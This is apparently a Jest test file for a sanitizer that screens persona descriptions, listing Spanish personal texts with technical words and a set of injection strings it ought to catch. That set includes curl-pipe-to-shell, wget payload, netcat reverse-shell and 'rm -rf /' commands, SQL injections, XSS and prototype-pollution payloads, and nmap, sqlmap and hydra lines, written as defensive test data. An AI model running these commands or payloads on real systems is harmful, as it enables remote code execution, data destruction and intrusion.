const PersonaInputSanitizer = require('../../../src/services/personaInputSanitizer');

describe('PersonaInputSanitizer - Non-Personal Content Analysis', () => {
  let sanitizer;

  beforeEach(() => {
    sanitizer = new PersonaInputSanitizer();
  });

  describe('Current Pattern Analysis - Potential Issues', () => {
    test('should identify false positives in current patterns', () => {
      // These should be ACCEPTED as personal descriptions but current patterns may reject them
      const potentialFalsePositives = [
        'Mi trabajo es como function en JavaScript, transformo datos en soluciones', // Contains "function"
        'Soy desarrollador y echo en falta más tiempo para programar', // Contains "echo"
        'Me gusta print art y las técnicas de impresión', // Contains "print" 
        'Trabajo en una empresa SELECT de recursos humanos', // Contains "SELECT"
        'Soy import/export manager en comercio internacional', // Contains "import"
        'Mi función en la empresa es console a los empleados', // Contains "console"
        'Trabajo con GET requests y tecnologías web', // Contains "GET"
        'Me dedico al desarrollo web y uso HTML tags regularmente', // Contains "HTML tags" pattern
        'Soy consultor JSON y trabajo con APIs', // Contains JSON pattern
        'Mi perfil profesional incluye C programming y desarrollo', // Contains "include"
      ];

      potentialFalsePositives.forEach(text => {
        const isNonPersonal = sanitizer.containsNonPersonalContent(text);
        const sanitized = sanitizer.sanitizePersonaInput(text);
        
        console.log(`Text: "${text.substring(0, 50)}..."`);
        console.log(`  Non-personal: ${isNonPersonal}`);
        console.log(`  Sanitized: ${sanitized !== null}`);
        console.log('---');
      });
    });

    test('should identify missed injection attempts in current patterns', () => {
      // These should be REJECTED but current patterns may miss them
      const potentialFalseNegatives = [
        // More sophisticated JavaScript injections
        'const malicious = () => { alert("xss"); }',
        'document.querySelector("#user").innerHTML = "<script>alert(1)</script>"',
        'window.location = "javascript:alert(1)"',
        
        // SQL injections not starting with SELECT
        'INSERT INTO users VALUES ("admin", "password")',
        'UPDATE users SET password = "hacked" WHERE id = 1',
        'DELETE FROM users WHERE 1=1',
        'UNION SELECT * FROM passwords',
        
        // Python code variations
        'class User: def __init__(self): pass',
        'if __name__ == "__main__": execute_malicious()',
        'os.system("rm -rf /")',
        
        // Shell command variations
        'bash -c "curl malicious.com/script | sh"',
        'wget http://evil.com/payload.sh && chmod +x payload.sh',
        'nc -e /bin/sh attacker.com 4444',
        
        // HTML/JS variations
        '<img src=x onerror=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        'javascript:eval(atob("YWxlcnQoMSk="))',
        
        // JSON-like but malicious
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
        
        // Base64 encoded payloads
        'eval(atob("Y29uc29sZS5sb2coJ2hhY2tlZCcp"))',
        'exec(base64.b64decode("aW1wb3J0IG9z"))',
        
        // Template injection attempts  
        '{{7*7}}',
        '${7*7}',
        '#set($x = 7*7)$x',
        
        // Command line tools
        'nmap -sS target.com',
        'sqlmap -u "http://target.com/page.php?id=1"',
        'hydra -l admin -P passwords.txt target.com',
      ];

      potentialFalseNegatives.forEach(text => {
        const isNonPersonal = sanitizer.containsNonPersonalContent(text);
        const sanitized = sanitizer.sanitizePersonaInput(text);
        
        console.log(`Text: "${text.substring(0, 50)}..."`);
        console.log(`  Non-personal: ${isNonPersonal}`);
        console.log(`  Sanitized: ${sanitized !== null}`);
        console.log('---');
      });
    });

    test('should analyze edge cases and ambiguous content', () => {
      const ambiguousContent = [
        // Technical but personal descriptions
        'Soy programador senior con 10 años de experiencia en JavaScript',
        'Trabajo como DBA y manejo queries SQL diariamente',
        'Me especializo en frontend con HTML, CSS y frameworks modernos',
        'Soy security researcher y analizo vulnerabilidades web',
        'Mi pasión es el desarrollo mobile con React Native',
        
        // Could be legitimate or injection
        'function developer() { return "passionate coder"; }',
        'SELECT knowledge FROM experience WHERE years > 5',
        'import passion from "coding-life"',
        '<developer>Passionate about clean code</developer>',
        'console.log("Love programming and coffee");',
        
        // Natural language with technical terms
        'Mi función es liderar el equipo de desarrollo',
        'Tengo que import nuevas tecnologías constantemente', 
        'Mi console personal es que soy muy perfeccionista',
        'Me gusta hacer debugging de problemas complejos',
        'Soy muy proactivo para hacer deploy de soluciones',
      ];

      ambiguousContent.forEach(text => {
        const isNonPersonal = sanitizer.containsNonPersonalContent(text);
        const detection = sanitizer.detectPromptInjection(text);
        const sanitized = sanitizer.sanitizePersonaInput(text);
        
        console.log(`Text: "${text}"`);
        console.log(`  Non-personal: ${isNonPersonal}`);
        console.log(`  Injection score: ${detection.score}`);
        console.log(`  Final result: ${sanitized !== null ? 'ACCEPTED' : 'REJECTED'}`);
        console.log('---');
      });
    });
  });

  describe('Context Analysis Requirements', () => {
    test('should analyze code density vs natural text patterns', () => {
      const testCases = [
        {
          text: 'function malicious() { alert("xss"); }',
          expectedCodeDensity: 'HIGH',
          expectedPersonalContent: 'LOW'
        },
        {
          text: 'Soy desarrollador y me gusta programar en JavaScript usando functions',
          expectedCodeDensity: 'LOW',
          expectedPersonalContent: 'HIGH'
        },
        {
          text: 'SELECT * FROM users; DROP TABLE passwords;',
          expectedCodeDensity: 'HIGH', 
          expectedPersonalContent: 'LOW'
        },
        {
          text: 'Trabajo con SELECT queries en mi día a día como analista de datos',
          expectedCodeDensity: 'LOW',
          expectedPersonalContent: 'HIGH'
        }
      ];

      testCases.forEach(({ text, expectedCodeDensity, expectedPersonalContent }) => {
        // This would be the enhanced detection logic we need to implement
        const analysis = null; // Placeholder for future implementation
        
        console.log(`Text: "${text}"`);
        console.log(`  Expected code density: ${expectedCodeDensity}`);
        console.log(`  Expected personal content: ${expectedPersonalContent}`);
        console.log(`  Current detection: ${sanitizer.containsNonPersonalContent(text) ? 'NON-PERSONAL' : 'PERSONAL'}`);
        console.log('---');
      });
    });

    test('should identify patterns for contextual analysis', () => {
      const contextualPatterns = {
        // Code density indicators
        codeIndicators: [
          /[{}();]/g,                    // Code punctuation
          /\b(var|let|const|def|class|if|else|for|while|function|return)\b/g, // Keywords
          /[=+\-*/<>!&|]/g,             // Operators
          /["'`]/g,                     // String delimiters
          /\b[A-Z_][A-Z0-9_]*\b/g,      // Constants
        ],
        
        // Natural language indicators  
        personalIndicators: [
          /\b(soy|me|mi|mis|yo|my|i|am|like|love|hate|prefer)\b/gi,
          /\b(gusta|molesta|afecta|importa|trabajo|estudio)\b/gi,
          /\b(años|experiencia|passion|dedicated|professional)\b/gi,
        ],
        
        // Context bridges (technical but in personal context)
        contextBridges: [
          /\b(trabajo\s+con|uso|manejo|especializo\s+en|experiencia\s+en)\b/gi,
          /\b(my\s+job|work\s+with|specialize\s+in|experience\s+with)\b/gi,
        ]
      };

      // This analysis would help implement better contextual detection
      console.log('Contextual patterns identified for future implementation:', 
                  Object.keys(contextualPatterns));
    });
  });

  describe('Performance and Edge Case Analysis', () => {
    test('should handle malformed or edge case inputs', () => {
      const edgeCases = [
        '',
        ' ',
        'a',
        'function', // Single keyword
        'SELECT',   // Single keyword
        'function function function', // Repeated keywords
        'Mi trabajo función SELECT import console', // Multiple keywords in context
        'function(x){return x}', // Compact code
        'f u n c t i o n ( ) { }', // Spaced out code
        'FUNCTION() {}', // Case variations
        'Function() {}',
        'función() {}', // Spanish variation
      ];

      edgeCases.forEach(text => {
        const result = sanitizer.containsNonPersonalContent(text);
        const sanitized = sanitizer.sanitizePersonaInput(text);
        
        console.log(`Edge case: "${text}" -> Non-personal: ${result}, Sanitized: ${sanitized !== null}`);
      });
    });
  });
});